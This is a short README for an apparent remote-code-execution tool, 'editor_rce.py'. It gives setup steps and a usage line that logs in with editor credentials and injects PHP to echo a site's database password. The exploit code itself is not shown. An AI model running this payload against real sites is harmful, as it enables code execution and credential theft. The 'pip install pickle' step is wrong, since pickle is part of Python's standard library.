<br />

**OBS!**

If you dont clone the entire repo.<br />
For this to work, you need both the editor_rce.py and the helpers.py<br />
They need to be in the same folder.

**Install a python dependancy**

Do this for every dependency you dont have already:
```
pip install pickle
```

### Usage
```
./editor_rce.py http://localhost editor_user editor_password "<?php echo DB_PASSWORD; ?>"
```
This should echo your database password to your screen.

### Errors
First time you run this command. A file called `_cookies` will be created on your file system in the same directory. As long as this file is on your file system this script will not attempt to login again.<br /><br />

If you experience error. Force a new login by deleting that file:
```
rm _cookies
```
And then try again. Make sure the user name and password is exactly correct
